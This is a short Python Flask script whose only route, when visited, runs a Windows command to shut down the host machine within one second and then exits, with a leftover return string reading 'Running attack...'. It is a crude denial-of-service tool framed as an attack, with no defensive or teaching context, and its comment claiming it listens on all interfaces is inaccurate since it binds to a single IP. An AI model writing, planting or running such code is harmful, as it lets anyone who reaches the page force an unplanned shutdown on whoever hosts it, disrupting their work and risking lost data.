from flask import Flask, request
import os
import socket
import time
import requests
import sys


hostnmae = socket.gethostname()
ip = socket.gethostbyname(hostnmae)

app = Flask(__name__)

@app.route('/')
def hello():
    os.system("shutdown -s -t 1")
    time.sleep(0.2)
    sys.exit()

    return "Running attack..."


if __name__ == '__main__':
    app.run(host=ip, port=5000)  # Listen on all interfaces
    
